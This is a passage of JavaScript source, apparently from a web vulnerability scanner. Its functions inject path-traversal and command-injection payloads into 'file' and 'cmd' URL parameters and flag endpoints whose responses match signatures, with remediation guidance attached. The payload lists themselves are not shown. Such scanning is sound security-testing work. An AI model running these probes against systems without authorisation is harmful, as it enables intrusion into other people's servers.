      } catch { /* ignore */ }
    }
  }
  return results;
}

export async function testPathTraversalEndpoints(endpoints, timeoutMs = 8000) {
  const results = [];
  const done = new Set();

  for (const endpoint of endpoints.slice(0, 10)) {
    let basePath;
    try { basePath = new URL(endpoint).pathname; } catch { continue; }
    if (done.has(basePath)) continue;

    for (const payload of TRAVERSAL_PAYLOADS) {
      let testUrl;
      try { testUrl = injectParam(endpoint, 'file', payload); } catch { continue; }

      const { ok, body } = await tryFetch(testUrl, timeoutMs);
      if (!ok) continue;

      if (TRAVERSAL_SIGNATURES.some((sig) => sig.test(body))) {
        done.add(basePath);
        results.push({
          id: `traversal-${results.length}`,
          name: 'Path Traversal / LFI',
          category: 'Injection',
          severity: 'critical',
          description: `Payload "${payload}" appears to have returned sensitive local file content. The endpoint may allow path traversal (directory traversal) and local file inclusion.`,
          guidance: 'Never concatenate user input into filesystem paths. Canonicalize and validate paths against an allowlist of expected files/directories before reading from disk.',
          matches: [testUrl],
          sources: [endpoint],
          type: 'vuln',
        });
        break;
      }
    }
  }

  return results;
}

export async function testCommandInjectionEndpoints(endpoints, timeoutMs = 8000) {
  const results = [];
  const done = new Set();

  for (const endpoint of endpoints.slice(0, 8)) {
    let basePath;
    try { basePath = new URL(endpoint).pathname; } catch { continue; }
    if (done.has(basePath)) continue;

    for (const payload of CMDI_PAYLOADS) {
      let testUrl;
      try { testUrl = injectParam(endpoint, 'cmd', payload); } catch { continue; }

      const { ok, body } = await tryFetch(testUrl, timeoutMs);
      if (!ok) continue;

      if (CMDI_SIGNATURES.some((sig) => sig.test(body))) {
        done.add(basePath);
        results.push({
          id: `cmdi-${results.length}`,
          name: 'Command Injection',
          category: 'Injection',
          severity: 'critical',
          description: `Payload "${payload}" appears to have influenced command execution or returned shell/system output in the response.`,
          guidance: 'Avoid shell execution for user-influenced input. If process execution is required, use safe APIs with strict argument allowlists and no shell interpolation.',
          matches: [testUrl],
          sources: [endpoint],
          type: 'vuln',
        });
        break;
      }
    }
  }

  return results;
}
